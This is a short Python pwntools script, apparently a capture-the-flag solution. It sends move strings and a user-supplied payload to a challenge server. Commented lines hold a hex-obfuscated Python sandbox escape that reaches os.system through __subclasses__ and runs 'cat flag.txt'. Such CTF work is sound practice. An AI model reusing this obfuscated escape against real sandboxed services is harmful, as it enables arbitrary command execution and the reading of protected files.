from pwn import *

#print(getattr(getattr(getattr(bytearray().decode(), bytearray([0x5f,0x5f,0x63,0x6c,0x61,0x73,0x73,0x5f,0x5f]).decode()), bytearray([0x5f,0x5f,0x6d,0x72,0x6f,0x5f,0x5f]).decode())[1], bytearray([0x5f,0x5f,0x73,0x75,0x62,0x63,0x6c,0x61,0x73,0x73,0x65,0x73,0x5f,0x5f]).decode())())

#getattr(getattr(getattr(getattr(getattr(bytearray().decode(), bytearray([0x5f,0x5f,0x63,0x6c,0x61,0x73,0x73,0x5f,0x5f]).decode()), bytearray([0x5f,0x5f,0x6d,0x72,0x6f,0x5f,0x5f]).decode())[1], bytearray([0x5f,0x5f,0x73,0x75,0x62,0x63,0x6c,0x61,0x73,0x73,0x65,0x73,0x5f,0x5f]).decode())()[84], bytearray([0x6c,0x6f,0x61,0x64,0x5f,0x6d,0x6f,0x64,0x75,0x6c,0x65]).decode())(bytearray([0x6f,0x73]).decode()),bytearray([0x73,0x79,0x73,0x74,0x65,0x6d]).decode())(bytearray([0x63,0x61,0x74,0x20,0x66,0x6c,0x61,0x67,0x2e,0x74,0x78,0x74]).decode())

payload = input("Enter payload:")
payload += " ; a2a3 ;"

n = 33
input_list = []

for i in range(n):
    move = "x ; a2a3 ;"
    input_list.append(move)
input_list[0] = payload
input_list[23] = "x ; g1h2 ;"
print(input_list)

chal_host = "34.93.104.246"
chal_port = 1337

p = remote(chal_host, chal_port)

for user_input in input_list:
    p.sendline(user_input)
output=p.recvall(timeout=2).strip()
print(output.decode())

print("Done")
